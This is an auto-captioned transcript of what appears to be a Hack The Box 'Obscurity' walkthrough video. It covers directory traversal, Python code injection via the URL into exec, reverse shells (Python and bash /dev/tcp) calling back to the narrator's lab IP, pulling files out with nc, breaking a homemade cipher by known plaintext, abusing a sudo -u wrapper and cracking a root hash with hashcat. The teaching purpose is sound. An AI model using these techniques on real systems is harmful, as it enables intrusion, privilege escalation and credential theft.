 what's going on youtube this is ipsec we're doing obscurity from hack the box which is all about a developer trying to achieve security through obscurity by rolling his own land he rebuilt pretty much every piece of infrastructure like the http service coded in python but there's a directory traversal vulnerability that leads to source code disclosure and once you read the source code of the web server you realize there's an rce and the way it handles urls you get on the box you notice that he rolled his own crypto which is pretty much just a vegeneer cipher that's vulnerable to known plaintext attacks and encrypted his password in it but he's also encrypted other things in it like examples and you can use a known plain text attack to reverse the key then use the key to decrypt his password database log into the boxes him and see he did something weird with a better ssh which is pretty much just a wrapper for sudo that is vulnerable to overloading the dash u parameter so you can just sudo as root unintendedly so yeah that is pretty much it but this video i'm going to go on a lot of rants starting with right now because people say there's no such thing as security through obscurity which is kind of a trigger for me i very much believe there is as long as you include deceptive technologies and techniques along with honey pots and the obscurity realm because once an attacker falls for the trap once then they start questioning everything they're doing two examples would be the very first one i like doing is setting up to ban to instead of drop an ip after like 10 failed ssh attempts to just direct them to either kippo or kaori let them in see what they do and they may notice like the ssh key changing or just something weird like oh god what's going on here they're actually doing weird traps and maybe they fall for it and you get some good information if they don't fall for it well now they're just putting that in the back of their mind the other one is like honey accounts meaning like create a kerberostable account with no logon hours that's a member of domain administrators and name him something enticing like backup admin or acronis and see if anyone ever requests a ticket from him as long as you never use that account the ticket should never be requested also make it kind of a crackable password so if you ever see a successful or failed login to that account you can know immediately and then once things like that happen then if anyone cracks a password like is this a honey account will this actually work will this just get me banned i don't know so oh with that rant being done let's just jump in the box and get on with it as always we're going to start off with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats print the nmap directory and call it obscurity and then the ip address which is 10 10 10 168. it can take some time to run so i've already ran it looking at the results we have just a bunch of information on the screen the very first thing we have is ssh on port 22 and spanner tells us it's an ubuntu server the next thing we have is http on port 80 but this port is respon reporting closed and every other port isn't saying closed so generally this means port 80 is behaving not like the others so most cases that either means we tripped an ids and got blocked or there's some type of port knocking installed so let's go create some notes and we'll just take note of that um port 80 closed and we'll say ids port knocking blocked we don't know so just comment revisit that i'll probably start up another nmap wait like 10 minutes and check that port again to see if maybe we're unblocked then the next thing we have is bad http server on port 8080 and it is open and looking at the scripts it looks like nmap's just a little bit confused about it and outputting a bunch of text we see like a http response header this is the 200 okay and then the http server header is bad http server so we know this is a web server and maps just a little bit confused so it's showing us a bit more information probably because it knows things like apache nginx light httpd it doesn't know what bad http server is so let's take note of that so port 8080 and we'll say custom web server and nmap gets this from the actual host header so if we wanted to um we could do a curl quest i want to make a head and head it's only going to show you the um headers of the request so we'll do curl dash capital i for head and then 10 10 10 168 80 80. and this is the header of the response and we can see the server is saying hey the type of server i am is bad http server so definitely a little unique there and then the next thing we have is port 9000 closed and just skimming this the text wordpress caught my eyes so maybe port 8080 has wordpress installed but let's go to notes and say 9000 and that'll be it so also seeing that we have two ports behaving oddly iptables is maybe configured on the box so we may have to do things when it comes to like reverse shells because iptables has been used once it may be used again to block certain ports going outbound or things like that so just something to keep in mind when you see that if you see something early on maybe it's used later um let's see what i was going to do is a sleep for 600 and then we'll do nmap dash p 80 9000 and that should be a comma on 10 10 10 168 oh a nmap blocked ports and i'm not going to do a sin scan which is default that would be i think dash ss i'm going to do a full tcp scan because this is as normal as possible i don't want to trick uh trigger any ids's so yeah we'll just run that and we'll see what happens so let's go over to the actual web server so navigate to 10 10 10 168 8080 brings us to a webpage so right off the bat i'm going to start up a go buster so go buster dir for directory mode uh dash u for url paste it dash w for word list user share word list dirtbuster directorylist23medium.txt and we'll do dash o go buster.out and i'm gonna do like index.php we see this is not found html this is the page so um [Music] probably i can do an extension in my go buster we'll just look for directories oh god did not like that uh is there is like option for port grip dash i port huh let's send this let's try a user agent uh no status proxy where is user agent i user dash lower case a dash a let's send this request over to burp suite and copy our user agent seed response starting with i have no clue what this is dash p 12701 8080 let's see go buster dash h grep dash i proxy and we need to specify http colon slash clear iq send this does go buster really not like having this extra line break it's enclosed i honestly don't know what's going on here let's see intercept response forward delete i don't know something is weird going on there so we're just going to uh ignore that for now and play with this web server um looking through this here at secure motto security through obscurity i guess i can make this font bigger all our own software from scratch even the web server this is running on that means no exploits can possibly exist for it which means it's totally secure so we know they're using a custom web server if the server hangs for 30 seconds it will probably be restarted and they've also replaced ssh and have ran their own krypto it looks like we may have the boxes name obscure.htb leak there let's see server devs the current source code for the web server is in super secure server.pi and the secret development directory so there's probably some type of directory in this and that is um where this source is so let's delete gobuster.out and i guess we can do w fuzz so we will want the dash u for url http 101010 10 168 colon 8080 and then we'll do the directory as fuzz and w4 list user share word list turnbuster directory list 2 3 medium.txt start this off and let's see we can probably do dash dash hl what is it hw 14 for 14 words okay so it looks like these weird comments got more paid uh things it's probably because it started with the hashtag which then got dropped and this is probably index.php for all these so looking like it's good we could have probably also done um dash hc for 404 to hide all four or four error messages but that's good and we should copy that super secret server into our notes server source and they say roll their own ssh and i put question marks there because if we went back to the nmap and it looks like the block ports are still on closed but if we go back to the admap scan we see a normal ssh banner and we didn't see a normal http banner so i don't know what that whole roll your own ssh was about um we see looks like some dead links so i'm going to press f12 to open up developer mode and look at this source uh looks like i guess font awesome didn't get loaded uh this class f a f a globe that stands for i think font awesome and that's just a like ascii globe symbol so um yeah and if we went to maybe the console we do see some syntax issues with javascript so something didn't load correctly we see this custom js so let's take a look at exactly what this is uh doesn't look too special they said they used wordpress i think we saw wordpress in the source so i'm going to do wp-admin to see if that exists and i guess we should turn burp suite off we get a 404 looking at the page source dash wp we don't see anything uh wordpress is in comments so maybe this is just try and be obscure and make you think it's wordpress but it's not actually wordpress because a lot of wordpress stuff would have like wp-content i think uh wp dash admin of course and things like that so this looks like a static page going back over to w fuzz we didn't really see anything um they said maybe we don't have like execute permission on a directory i forget exactly what permission is i think execute you need to list the contents of a directory maker test chmod uh 500 test so we have read and execute so we can go in it let's do 400 we can only read so if we go into test uh we can list the contents i bet it's happening because we'll root um cat etsy pass wd su ipsec actually cd temp make dirt test chmod 400 test where's test read so let's do 444 and we'll put please subscribe and test go to ipsec cd test uh temp test cd temp and if we go cat temp please subscribe no such follow directory oh temp test cat let's do bash so i can see what directory i'm in cat test please subscribe permission denied oh my god cd test let's see let's do chmod one test so it looks like with execute permission we can go into the directory but we can't list the contents if we had read permission we could probably go into the directory and list the contents but if we just specify the file we can read it so that's what i'm doing here so i'm going to put content in that do ls mission denied cat please subscribe and it says thanks so if we chmod to what was it 555 on temp test now we can list files in it and of course we could cap them if we could type so that's that directory permissions are a bit weird so direct permissions may be wonky on this so let's go back to our w fuzz and we're going to say fuzz with super secure server.pi and that is what is on the page so development super secure server so we'll do that and while that goes let's go and fuzz this on our own because this is a custom web server i'm going to try several things so the very first thing is directory traversal what happens if i do dot dot slash we get not found and documents there so let's do a few of these still four four etsy pass wd and the server stops responding if we put does not exist etsy passwd we get a 404 so i think we've just confirmed directory traversal right because we got a different response when we specify a file that exists i'm just going to get rid of a few of these at a time to see if maybe we have to be exact and we have four or four not found so if we were in like ver dub dub dub html then this would be cadding like slash ver slash etsy pasta bd and not existing so it looks like there is definitely directory traversal and generally how like python applications work is let's do uh the i guess i can do it in notes so you generally have like let's say flask and then flask will have server.pi and then there will be like um the application name which is another directory so let's say web server is what do we want to call the web server or the website we'll call it ipsec.rocks and then in this you'll probably have another ipsec.rocks and then in this you'll have the actual uh site.pi code maybe like static and then inside of static you'd have uh javascript and then inside of javascript you could have like what is it uh not bootstrap jquery.js and things like that so right now we're probably inside of this ipsec.rocks directory so if we go up one directory and try to cat the python file what will happen so we can do dot dot slash super secure server dot pi and we get a file and this looks like to be the source code to the actual web server so let's just grab this and we can copy and make their we'll call this source and they also say they roll their own like um ssh server i'm going to call source web because i expect to have more source code and a little bit so this is super secure server dot pi and paste this in and looks like we have quite a bit information just going down to see something it looks like we got some comments here and generally when there's comments uh there may be something good because it indicates recent changes of the file don't see anything around that there's where they're setting the server header as bad http see we have exec right here and exec and python will do bad things um if we just do python 3 exact and yeah it's supposed to be in chords i think print please subscribe hey prince exec is essentially the same thing as eval but the difference being exact will always return none so i just did x is equal to eval uh it's not there let's say x is equal to exec i'm not exactly sure um i know there's a slight difference between exact and eval they both execute code you may want to google it and learn a little more but that's definitely a dangerous thing to do and it's giving us path so my best guess is path is going to be the url so they're probably doing some type of code execution upon the url so what we'll want to do is debug this and identify exactly what's going on and you may be shocked but normally when i code i don't use vi i normally am a huge fan of visual studio code so let's go install that uh visual is it visual studio code or vs code yeah here it is visual studio code this is it uh deb and where is this oh it looks like it's just downloading okay so i'm going to copy that into temp because i don't actually know what's in my downloads i don't feel like showing everyone so i'm just going to copy that to dev shm and then we can do app install dot slash code and you could probably do d package dash i install it with that i like installing things with apt just because i feel safer doing it it's probably the same exact thing as using d package but i just feel safer it's going to put it in some database and remember it because i don't think code is in cali the package is called code so uh it's gonna be pretty hard to find uh we could probably do code grab dash i visual grab dash i studio exalt yeah i don't think vs code is inside of the normal cali repel but yeah so we got that and we will open vs code now so let's do code and oh i really should just upgrade cali and get rid of my root user and join the pack but i just don't like debugging on videos and i always run into issues on latest latest cali maybe we'll do that for the future video let's do make dir um we'll call dot code and we'll do code dash dash user data code and there we go so let's do open folder and we want to go to root hdb boxes obscurity source web go there i don't know why it's not going oh that's annoying home hdb boxes obscurity source web go here we go and whenever this box pops up of saying you can install an extension always click yes i've clicked no before and then it just didn't pop up again and it's been a pain to get that back when that happens so all that installs got it sure good so we can exit that w fuzz didn't find and honestly should have found it um hc for code 404 and we'll try that again we may have to dig into what's going on there because i'm doing something wrong because this whole thing with that path traversal was unintended we'll install that python plugin and let's see so the main issue we're going to have is there's no main in this code there's another python file we're missing and you could do w fuzz and find it but you could also just guess at various python files and the name is main.pi or if you spent a lot of time reading the code you'd know to create this file because this isn't rocket science to create this code if you do look at the server function in this you'll see it wants host and port that's what this is so and document root so it's not rocket science to create that main dot pi if you didn't know about it so let's go source web v main dot pi paste that in i don't know why that's indented so much and then this should automatically have it and doc root is dark root so let's make the dark root to make this happy and that should be all we need so let's see if we hit f5 to run we can do python file and let's see address is already in use oh because it's running on 8080 and that's where my burp suite is so let's turn this to 80 and save run python file it looks like it's running if we curl localhost index.html go back here we can see the server is working as we expect so it's trying to get errors for 4.html so if we go into doc root probably make the errors go in here v404.html please subscribe and now we rerun this curl command it's not going to error out and the 404 happens and the server responds with please subscribe so it's one thing i want to show and if you see this create a launch.json file after you stop it um actually let's not create it real quick so that's at this play button but if we went to super secure server hit f5 to run it it's not gonna run because it's trying to execute whatever file you have open so click on this play icon click this launch json say you want python and program this file means what active file you have open so we just wanted to do main.pi and save it and this way whenever you hit f5 it'll execute main.pi so we did all this mainly to be able to have access to debugging if we're just doing it in vi we could do print statements but print statements is not ideal so we wanted to find that exact code and i'm just going to press f9 is insert debug you can also uh click to the left of the line or right click and do it somewhere f9 is universal for the uh breakpoint so now when i hit f5 it's going to launch and we're going to curl localhost and we hit the breakpoint and whenever we highlight over something or look at this variables tab we can see what it is so path it's exacting is slash index.html so yeah becomes super easy um you also have this debug console so if you wanted to you could say path have it print out path um you could do code let's do info if you wanted to see what like functions would do to it before running code again you could like infer split and then grab the second item in that list things like that makes it super handy when doing anything so highly recommend vs code there's pycharm as well from jetbrains or something i just prefer vs code so let's see so we got exec right here so what if let's just do play what happened when we did dot dot slash dot dot slash oh we're gonna have to do a ton of dot dot slashes because we're in root http boxes of security source web dot root errors all right source web that's where we're at so we probably don't need that many but and still quite a bit so looking at this the path gets translated to etsy past wd it's piping that to exec and probably trying to execute that binary so if we had a way to upload something to the server we could probably get it executed by just doing this path traversal we could try like bin sleep plus five [Music] and see what happens here nothing maybe like percent 25 and i did that because it doesn't look like there's some type of url decoding option right here right because it said bin sleep plus five so if there was a euro decode it would translate that plus to a space and we'd see this um percent 20 looks like it got translated just fine run this it doesn't sleep for five seconds that we don't see anything so um doesn't really it's executing it's probably trying to execute ben sleep five as a whole path and not putting five as a argument and that's probably why it's failing so i can't get code execution that way but we can probably put python code so let's try print please subscribe like that and send it could not be found url encode everything could not be found oh we should change this to localhost so this will be server localhost click that pencil 127001 port 80 send look at the path so it's doing exact and then this okay i was hoping to see like please subscribe on the uh standard out or within burp oh we did uh we probably should use a different phrase because there are four or four error messages saying please subscribe so we'll say please support me on patreon send look at this and it's not saying please support me on patreon so we didn't get code execution it's a little bit confusing but if you remember a few minutes ago we made the 404 error message say please subscribe so let's [Music] put these in quotes and try again send okay we see we get code execution on the server doesn't appear on our output but the server definitely does say please support me on patreon so we have code execution we need to put these quotes and i'm not exactly sure why see send this again it's doing something i honestly did it because i saw a quote here and i was trying to close it but i realized it's probably not it um oh info format so it's probably closing crap don't highlight there we go so info format path this has the quote here so i'm probably closing this quote and going like this probably or something along those lines uh i think that's how it was hopefully it won't syntax there but have code execution so now we can look at the imports of this so if we scroll all the way up we see os uh socket threading subprocess so we can probably do os dot system who am i so instead of this print let's control shift you to on url and code let's try os dot system and we can run the command who am i cancel out send go and we are root because we're doing the dangerous thing and running this web server as root so we could validate we have code execution on the remote end of the server by using ping so tcp dump dash i ton xero icmp and go over here copy our payload paste our payload and we can do ping 10 10 14 2 and dash c1 for count 1 and we have to have spaces ctrl u i don't think that's actually going to work no can't find it so remember before we have to do percent 20s for space and we did that when doing the sleep and we saw when we got to the path it was sleep plus five we did percent 20 it was sleep space five so i'm placing those pluses with spaces and still document not found ping but we got a ping document not found but it works so huzzah and that is 10 10 10 68 pinging us and then we ping back so have code execution there if we wanted to we could do some weird way of doing command execution like curl 10 10 14 2 slash who am i like this and that may work ncl vmp 80. oh shoot um we got to stop the web server and i guess we can just do python 3 http server 80. we run this probably have to url and code this oh this has to be percent 20. and going here it does a get on slash wwe data so we can get output of commands that way but let's do a full reverse shell so let's do pen test monkey reverse shell and we can try let's try the python one first okay v let's do b rev dot pi paste and we don't need this python dash c we don't want the quotes the beginning and the end and we got to change this ip to be 10 10 14 2 because that's the ip of my box we do it on port 9001 and we don't have to do import socket sub processor os because those already exist because if we looked at these import statements in this script we got os socket and sub process okay i'm gonna get rid of this one space because we found spaces to be oh i wonder if that's an indent i'll leave that space there because they're not using spaces everywhere so that may be a weird python indenting thing so save it cpurev.pi to be a backup copy percent s space delete that one delete this one no more spaces left so let's run this actually before doing it let's do it on a local host first because this gives us uh visibility into debugging so we'll copy the payload in between the two semicolons and then we'll change this to be 127 0 0 1 url in code nclvnp 9001 we have to start the web server again looking at the path i guess eyeballing it it looks fine pass this through we don't see an error message and we have a shell so i think we did it correctly if we had an error message let's just put one um let's say let's get rid of this s i don't know feeling feisty so close this send go i was expecting to see an error message we don't have one but i guess you could play with the path and see that weird uh set control z to undo there we go let's now do 10 10 14 2. copy this let's do it against the server and i'm making sure it begins and ends with a single quote we are listening send that baby off and get over a shell so the very first thing we want to do is upgrade our tty so python i will do which python which python3 so python3 is on this box import pty pty dot spawn been bash and then control z stty raw minus echo fg enter twice and we have a show on the box that we have tab auto completion tool so what i'm going to do right now is look for where super secret server is or super secure server my bad and we're in var so if we go cd slash var super secure server and then go into doc root to see what else there is we already found main dot pi and super secure server dot pi so this is their directory and the hidden directory they have is develop and index dash orange gray and green what uh obscura index.orange.html what is this a forever loading thing green it just changed to green okay not sure what that is but there is this develop directory and develop has the source code to the server if we do lsla it's there so the reason why that if you just go to slash develop if we just do slash develop we get a 404 because they don't have any type of directory listing enabled in their code so it's not just printing out the thing but if we did develop super secure server.pi you'd get the code that way so i'm not sure why w fuzz missed it so let's do v uh we'll do wl i guess develop and we'll do does not exist and please subscribe okay rerun this with the word list of our choosing which will be root hdb boxes obscurity and then well i found it is it not in this so grab develop uh beginning with develop and then ending it's definitely in this word list all i changed in the command was the word list see how it finds it it's weird that it didn't maybe it ends or crashes after a certain period of time uh let's go up 2041 fatal exception empty airplane so i think w fuzz is crashing before it hits something because i think there's definitely more than 2041 or 2042 uh lines in this word list so yeah around 2042 it crashes if we cut this word list and pipe it to wc-l for line count there's 200 or is that 2 million no 220 000 lines in this so we barely even dent this um we go here and search for develop development for hers we are at line four thousand five hundred so which is that a case of the server crashing that's why we couldn't find it with w fuzz but if develop was earlier in the word list we'd find it no problem so that is that piece i like the directory traversal better and oh god uh maybe this is why go buster was airing honestly it probably hits things like etsy past wd and crashes so we're getting standard out of the web server so hold on one second if we just do etsy wd it puts the output in a web shell so that's probably why go buster was airing earlier is just because it hit things it didn't know how to respond to and uh yeah so those probably weren't go buster crashing completely it was probably just this response aired out because we gave it something bad oh well the path traversal is definitely cooler if i have to say so myself so what i was looking for here not to like jump back and forth 50 billion times but whenever i get on a web server i like looking to for any configuration files and potentially finding like database configs or something we don't see anything here so nothing too special looking at init looks like it's just starting the web server pi cache is just compiled python files normally like pyc yeah so let's go to home see what it uses on the box we got robert we can go into robert and we have a few files so we have better ssh but we also have super secure crypt so let's take a look at what password reminder is and junk so let's see go back here super secure crypt oh you're gonna hate me i want to look at ip table rules real quick don't see any i was looking for this when i went back here but i don't know if i can find ip tables rules with this permission set so we'll do that one get root um going back to it uh password reminder.txt so you go to gibberish check.text or just [Music] check dot text out.text is gibberish uh user.txt denied so let's copy super secure server back to our box do we have nc we do so let's do source maker crypto nclvnp 9001 direct that to super secure crypt dot pi cat that nc 10 10 14 2 9001. okay sent that file we have it we're going to do the next one password reminder.txt got that one we've got check.txt and out.text sent that and i'm hitting ctrl c after each of these it's not terminating itself out okay so we should have each of these files so let's take a look at what super secure crypt is so let's see we got cis and arcbers and it's got a definition for encrypt and decrypt so the encryption is taking the character of the new character plus the key character and then i think that's an and or no that's a modulus i think 255. okay glenn so if you don't didn't know python well you could just easily play with this on your machine so you could do like um one plus five percent 255 and we should put these in parentheses and we get six but if we do 256 or let's do 255 or we'll do 250 plus 42. we get 37. so what the modulus is doing is pretty much just i guess think of it doing long division and giving you the remainder so if we did [Music] 500 we get 32 because 255 plus 255 is 510 and 542 minus 510 is 32. so it just gives you the remainder so think of it as i call it modulus well that's what it's called is modulus but i remember it uh let's see infinite loop picture like i guess maybe this will be fine in my head i picture more of a just band but i think a modulus let's say 255's here goes around up back down hits 255 and starts again so this one two three four five six seven eight hundred two hundred two fifty two fifty five gets here starts over and just keeps on looping so that's what that percent does um so let's see infile out file key so let's see where to write go back to these so what we see right now is if we look at check.text encrypting this file with your key should result in out.text make sure your key is correct and we have out.text as being gibberish so if we do xxd out.text and xxd um check.text see they're not the same size i was hoping they would be oh this may be just double c two see they may have changed the encoding to be 16 byte and like maybe each of these is a null byte and it's leaking a part of the key this way um let's do do we have a calculator in this bk calc what calc i run calculator and i get shell okay oh it it's not a gooey calculator um 0x be 0 to decimal 176. so [Music] l.text is 176. and check.text i'm guessing is gonna be exactly half of that that's 50 80. so i'm guessing that's what went on there's some type of weird converting to um 16 byte but none of that really matters um essentially what they're doing i think is like a visionaire cipher which isn't using any initialization vector or anything it's essentially like ecb electronic code book mode um essentially it's doing something like to encrypt think of it as a stupid dumb plain uh explain it like on five it's doing plain text plus the key is equal to the cipher text right this is essentially what the algorithm's doing so because it's not resilient against known playing uh yeah known plain text attacks we can essentially minus plain text from here and that just leaves key so is equal so if we minus it from there and we minus it from this side think of this just like algebra now the formula becomes key is equal to cipher text minus plain text and this is essentially going to give us the key right that's what the encrypt decrypt is doing so if we go here new care is doing plus we got minus here so since i think i just got rid of oh i got rid of my pretty thing oh no i saved it awesome since we know the cipher text and we know the plain text the plain text the cipher text is going to be out.text and this is check.text or maybe i have them reversed check.text yeah since we know these two things if we uh call it decrypt we'll get the key right so it's going to open a new thing source crypto i just wanted to split it in half them super secure because we want to look at the flags so let's see we'll do dot slash or python 3 super secure crypt and the flags we want um let's see ergs d so if i want dash d for decrypt hugs o writing to so dash o is going to be out file so this will be called we'll call it key dot text um dash i is probably input this rx.i right here opening file exact i yep so that's input and we want um out.text oh wait i think it's still right i don't like how they're doing this i like using arg purse so if ergs.d do decrypt else do encrypt okay so we're in this opening file as f decrypt or exactly dash o key dot text i out dot text what is k okay dash k is going to be check right maybe no let's swap okay and [Music] let's write this out uh cd source crypto the nodes.txt so decrypt i is equal to input file okay is equal to string because it's not reading anything and o is equal to output file okay this makes more sense it's silly but makes sense so let's see check.text let's copy this okay so we're going to put k as a string and we're going to do this an input file is going to be uh out text right yeah and now file is going to be q text hopefully that makes sense doing it this way so dash d to go into decrypt mode um dash i health.txt dash k paste the key and dash o key.text text and we get words that just keep repeating so the key is alexander overcool or ovitch yeah alexander irvitch and because the uh plain text is longer than the key it just keeps repeating itself so i'm going to copy this and the input file now is going to be password reminder the key is going to be alexander kuvik and we're going to put decrypted.txt out file so input file password dot txt dash k dash o decrypted dot txt and we get secure through obscurity probably first sec through obs for the win uh if we go do i still have a shell in this box i do cat etsy pass wd there's only the user robert on the box if we ask you to him put the password we get to be executing as robert we could also now probably just ssh robert at 10 10 10 168 accept the key paste the password and log in so we no longer need this web shell so that's the name plain text attack um what we did you had the plain text plus the key is equal to the cipher and we had known pt is equal to um what is it encrypting this file and ciphertext was equal to a blob we knew it or out.text since we knew these two variables we could solve the key so the second formula was pt plus key is equal to ciphertext and we had the plain text oh we didn't have the plain text we had cipher text is equal to password reminder the key we didn't know and the plain text we wanted but we got the key results of number one and now that we had both the ciphertext and key we could get the plain text which is what we wanted so this is called the known plain text attack um you can kind of prevent it uh blocks cipher mode wiki they normally have good pictures so if you read all this it should help that's not what i want um this one no block cipher mode of operation okay this is a good wiki article so this is saying the math behind each one you can see ciphertext is only one thing electronic code book ciphertext key plain text like that's how you decrypt uh cipher block chaining they introduce this initialization vector and then key cipher and then use a piece of this to go to the next block and the next block in the next block so essentially what this is doing is let's go back to the very beginning uh key we'll just say times iv it may not be multiplication could be like x or something but that's irrelevant but now we have the key doing some type of operation so even if we subtract the plain text from both sides like we did with this one we're left with key iv is equal to cipher text minus plain text and because we still have two unknown variables and the initialization vector affects the key we can't solve for the ciphertext we actually know what iv equals because initialization vectors aren't secret you need to know that to decrypt it however the initialization vector is going to do something to the key that we just can't reverse until we have two copies of the message with a repeating initialization vector so like if we had key initiation vector ciphertext and then key the same exact initialization vector which is a number ciphertext minus pt2 which is a different plain text now we can start solving it because we have the same initialization vector repeated with the key with two known plaintext so that's why you should always when you use an initialization vectors you don't have to keep it secret but you can't replay that initialization vector um that was the downfall of um wep wire equivalent pre uh privacy the uh wireless encryption algorithm before wpa they flooded packets with de-authentication to force the computer to go through the whole initialization vector key space in a matter of minutes so with cracking um wep you just did d auth and the client would auth with key iv auth key iv2 and you kept de-authing and it kept changing keys and eventually oops it would replay the old initialization vector and you'd have two different packets with the same iv that you knew the plain text to and now you could crack it hopefully that makes sense um look up like how cracking wep works and you'd understand that but it's not needed for this box i don't know why i went into that tangent uh we are now robert so let's go on uh we got better ssh and it's more source code to look over so let's see the very first thing we're doing is i think creating a dict of user and authenticated zero and that's going to be session user it's asking us for the username and it's asking us for the password then it's going to open etsy shadow so i'm guessing i can execute this with sudo because the set uid bits don't work with just python scripts if you compile them to elf binaries then you can do set uid but since this is just a python script i'm assuming it's a pseudo so opening etsy uh yeah etsy shadow uh splitting upon this passwords append join and now it's opening temp ssh plus path path is random eight ascii characters writing the password file and then sort real pass if there's no salt invalid user and then it looks like it's doing an authentication so for some unknown reason the script is going into etsy shadow grabbing the password hash of the user you try to authenticate with throwing that into a file and temp that is completely random and then attempting to read that file and seeing if what you input as the password is correct and if it is then it will authenticate you if not it makes you exit and then deletes the temporary path and then while true it's going to do sudo dash u and keep in mind we'll root when we're running this so we'll root now executing sudo dash u to the session user and then executing command so there's two issues right here the first is um overloading arguments so right here we got the cmd as equal to sudo dash use session user and this is expecting us to be um like what we specify so this can be well we can auth probably as robert but we can also let's see cmd command split proc so eventually it grabs the command we're running and then doing another dash u we could change the user to root so we did i think if the command was like sudo dash u robert and then this is the start of our command right so delete this put two so essentially the expected command looks like this right and command could be running who am i and the response would be robert because we did sudo dash u robert who am i however because we control this command piece we can turn this command into sudo dash u robert dash u root who am i and also get root because it's always going to take the latest version of dash u so in command lines you can specify the same argument twice and whatever is the most right most argument will be what's used if that makes sense so i don't have the password still on my clipboard let's go over here uh cat decrypt grab this go [Music] ssh python3 better ssh go to robert paste this oh we have to sudo sudo user bin python3 ohm robert better sh robert password uh no such file directory looks like we have to create that ssh directory it probably aired out trying to write this random file to tap ssh which is the shadow file so let's see do we have tmox we do sweet so i'm just doing nested tmux now um the temp ssh so i'm going to do let me do two watch dash n .5 ls and this one will be watch dash n 0.5 and we will do cp star to dev shm so every five seconds we're attempting to copy everything in this directory to device hm so if it tries to clean it up it fails still got the pass on my clipboard so now we can do sudo uh do it let me just do sudo python3 better sh does that work nope uh sudo dash l sudo user ben python3 home robert bettera sage robert password auth and you saw this thing glitched out the ls i mean it happened so quickly didn't see anything but if we go dev shm we have a random seven characters if we cut this we got two password hashes robert and root because again it's copying the shadow to a text file so we could go over to the kraken and crack this hash but we know every command we're running is doing sudo dash u uh the session user which is gonna be robert and then who am i right so if we overload this to root who am i we're now root so dash u root can we do bash id uh we cannot oh we killed the whole thing uh sec do i have it in my clipboard do not was it sec through obs for the win ah that's not robert sec through obs for the win okay dash u root maybe bash dash i to interactive mode nope oh god i can't even control c out of that um that's unfortunate sudo user ben python3 um robert i'm sure there's a way to do that but root sec through obs for the win you could just um whoops robert sec through hobbs drop like a bash reverse shell and execute it so god nested tmux is sometimes breaks my mind but we could do cd oh cd temp uh v shell dot sh bin bash bash dash i dev dcp 10 10 14. typing way too fast 10 10 14 2 9 000 one zero and one sage mod plus x ncl vnp 9001 gets reverse shell go over here dash u root slash tab shell.sh and now we are root so cd slash root and we can get the file root.text 32 in a line break um still the password on the clipboard so let's go over to the kraken and crack it so cd hashcat v hashes slash that's sha 512 so we'll call it obs sha 512 paste do root colon dot slash cat example hashes shaw 512 shaw 512. it's not ldap hmac no shot 512 crypt this looks like it dollar six dollar mode eighteen hundred so dot slash hash cat dash m eighteen hundred hashes obs up the word list draw q and let this run uh oh we have to because i did root call in the hash i have to do dash dash username or maybe it's dash dash user i think it's username come on start cracking shot 512 crypt is relatively slow and looks like we cracked it to mercedes so if we go back ssh 10 10 10 168 mercedes we can't but root login may be disabled so if we do su i will probably still in the shell let's go to this pane but we're not in the shell we can exit this terminal uh s u dash mercedes and we root so if we look at cat etsy ssh sshd config grab i root uh root login is disabled somewhere i thought it would be easier to see i thought it would be like permit root login now but oh well that is the box i guess we can do iptables dash capital l holy crap uh this is running maybe firewall d shoot let's see ss lnp grappling 80 doesn't look like port 80 is listening 9000 doesn't look like that's listening either [Music] ufw oh maybe ufw show so ufw is like the uncomplicated firewall but man it's complicated to me i don't know any of these arguments i know iptable's better than that uh let's see accept accept accept where's a drop okay skip to policy input policy for there's a drop that's fine ufw not local denying logging come on there are so many things here ah ufw dump rules lib ufw user.rules lib ufw let's see rules cdufw cat user.rules so it's funny i'm guessing the default behavior on a port on this is set to not allow so if i do um nc lvmp 9001 on this box and we do nc 10 10 10 168 9001 we can't connect but if i did 9000 and go to 9000 i can connect so the default rule on this box is set to um probably drop not reject which means it's not going to do anything reject will send a packet back telling me it's not alive however we're allowing port 9000 and probably 80 somewhere and because we're allowing it we're not getting hit by that blanket drop rule that would be on any other port which is why it's behaving differently than um [Music] the others so my guess is the original intent for this box was to run like the web server on port 9000 and then have engine x running on port 80 and be a reverse proxy to this application but they decided just to expose the application to the outside world for whatever reason so yeah so there's no explicit rule blocking um 80 and 9 000. so we answered this question closed that's nope it's these ports are allowed but not listening and then any other port on this box is closed so iptables allows 80 9000 22 and 8080 drops all else inbound and because it does that those two ports behave differently and that's why nmap shows it so hope you guys enjoyed the box sorry for all the rambling but i know you guys or some of you like it take care and i will see you all next week